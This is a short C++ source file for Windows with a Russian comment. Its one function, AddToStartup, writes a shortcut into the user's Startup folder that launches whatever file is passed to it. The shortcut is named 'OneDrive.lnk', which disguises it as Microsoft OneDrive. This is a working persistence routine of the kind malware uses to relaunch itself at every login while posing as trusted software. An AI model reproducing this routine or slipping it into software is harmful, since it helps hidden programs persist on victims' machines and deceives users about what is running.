#include <windows.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <tchar.h>
#include "startup.h"

void AddToStartup(LPCWSTR lpFilePath)
{
    HRESULT hr = CoInitialize(NULL);
    if (FAILED(hr)) {
        return;
    }

    WCHAR szPath[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, 0, szPath)))
    {
        PathAppendW(szPath, L"OneDrive.lnk");

        IShellLinkW* pShellLink = NULL;
        if (SUCCEEDED(CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLinkW, (LPVOID*)&pShellLink)))
        {
            pShellLink->SetPath(lpFilePath);
            IPersistFile* pPersistFile = NULL;
            if (SUCCEEDED(pShellLink->QueryInterface(IID_IPersistFile, (LPVOID*)&pPersistFile)))
            {
                pPersistFile->Save(szPath, TRUE);
                pPersistFile->Release();
            }
            pShellLink->Release();
        }
    }

    // Освобождаем COM
    CoUninitialize();
}
